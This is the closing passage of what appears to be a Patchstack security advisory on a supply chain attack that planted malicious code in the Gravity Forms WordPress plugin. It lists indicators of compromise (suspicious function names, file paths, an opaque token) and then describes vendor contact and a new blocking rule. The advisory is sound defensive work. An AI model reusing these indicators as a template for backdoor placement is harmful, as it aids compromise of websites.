<li>Look for the presence of the function <strong>update_entry_detail</strong></li>
</ul>
</li>



<li>includes/settings/class-settings.php
<ul>
<li>Look for the presence of the function <strong>list_sections</strong></li>
</ul>
</li>



<li>wp-includes/bookmark-canonical.php</li>



<li>wp-includes/block-caching.php</li>



<li>Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3</li>
</ul>



<h2><strong>Conclusion</strong></h2>



<p>The reporter has reached out to RocketGenius, which is the developer of GravityForm, as soon as he noticed there was malicious code. The reporter has not heard back from them; however, he was able to confirm that the malicious code is not there anymore after a re-download around 1 hour after his first download of the plugin from the official site.</p>



<p>As this targeted supply chain attack is discovered and the community is made aware, it is likely that some or all of these indicators are subject to change. New versions of this attack are likely to appear on already affected sites or new sites in the future.</p>



<p>Patchstack will monitor the logs of our customers and has also attached a <strong>new rule to the &#34;Advanced Hardening&#34;</strong> module that will attempt to block any request made to the malicious domain and IP.</p>



<p>If you have any questions about this targeted supply chain attack or need any help, contact the Patchstack team.</p>




</span></p></div></div></div></section></div>
  </body>
</html>
